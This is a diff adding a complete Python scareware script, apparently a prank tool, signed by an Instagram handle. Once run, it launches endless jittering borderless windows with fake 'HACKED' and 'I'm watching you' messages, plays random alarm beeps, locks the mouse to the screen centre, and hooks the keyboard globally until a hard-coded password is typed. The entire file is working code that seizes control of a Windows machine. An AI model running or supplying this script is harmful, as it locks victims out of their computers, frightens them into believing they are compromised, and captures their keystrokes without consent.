@@ -1,0 +1,113 @@
+###creado por: Carlos , ig: m1ch33l #####
+import tkinter as tk
+import random
+import threading
+import time
+import winsound
+import os
+from playsound import playsound
+import pyautogui
+import keyboard
+
+mensajes = [
+    " TE OBSERVO",
+    "ERROR FATAL 0x000GL",
+    "CÓDIGO INFECTADO",
+    "SISTEMA VIGILADO",
+    "HACKED BY M1CH33L",
+    "¿QUIÉN TE DIJO QUE PODÍAS ESCAPAR?",
+    "ACCESO ILEGAL DETECTADO"
+]
+
+sonidos = [
+    lambda: winsound.Beep(random.randint(200, 3000), 200),
+    lambda: winsound.MessageBeep(winsound.MB_ICONHAND),
+    lambda: playsound("sonido.wav")  # Asegúrate de tener este archivo en el mismo directorio
+]
+
+# Variables de control
+ventanas_activas = []
+detener = threading.Event()
+CONTRASENA_SECRETA = "car45678"
+
+def reproducir_sonido_aleatorio():
+    while not detener.is_set():
+        try:
+            random.choice(sonidos)()
+            time.sleep(random.uniform(0.5, 2))
+        except:
+            pass
+
+def abrir_ventana():
+    ventana = tk.Tk()
+    ventana.overrideredirect(True)
+    ventana.geometry(f"500x200+{random.randint(0, 1000)}+{random.randint(0, 600)}")
+    ventana.configure(bg='black')
+
+    label = tk.Label(
+        ventana,
+        text=random.choice(mensajes),
+        font=("Arial", 18, "bold"),
+        fg="red",
+        bg="black"
+    )
+    label.pack(expand=True, fill="both")
+
+    ventanas_activas.append(ventana)
+
+    def vibrar():
+        for _ in range(50):
+            x = random.randint(0, 1000)
+            y = random.randint(0, 600)
+            ventana.geometry(f"500x200+{x}+{y}")
+            time.sleep(0.05)
+
+    threading.Thread(target=vibrar, daemon=True).start()
+    ventana.mainloop()
+
+def lanzar_ventanas_infinitas():
+    while not detener.is_set():
+        threading.Thread(target=abrir_ventana, daemon=True).start()
+        time.sleep(0.2)
+
+def bloquear_mouse():
+    ancho, alto = pyautogui.size()
+    centro_x, centro_y = ancho // 2, alto // 2
+    while not detener.is_set():
+        pyautogui.moveTo(centro_x, centro_y)
+        time.sleep(0.01)
+
+def escuchar_contrasena():
+    buffer = ""
+    while not detener.is_set():
+        key = keyboard.read_event()
+        if key.event_type == keyboard.KEY_DOWN:
+            if key.name == "enter":
+                if buffer == CONTRASENA_SECRETA:
+                    detener.set()
+                    cerrar_todo()
+                else:
+                    buffer = ""
+            elif len(key.name) == 1:
+                buffer += key.name
+            elif key.name == "backspace":
+                buffer = buffer[:-1]
+
+def cerrar_todo():
+    print("Contraseña correcta. Cerrando todo...")
+    for ventana in ventanas_activas:
+        try:
+            ventana.destroy()
+        except:
+            pass
+    os._exit(0)
+
+# Iniciar hilos
+threading.Thread(target=reproducir_sonido_aleatorio, daemon=True).start()
+threading.Thread(target=lanzar_ventanas_infinitas, daemon=True).start()
+threading.Thread(target=bloquear_mouse, daemon=True).start()
+threading.Thread(target=escuchar_contrasena, daemon=True).start()
+
+# Mantener vivo el script principal
+while not detener.is_set():
+    time.sleep(1)
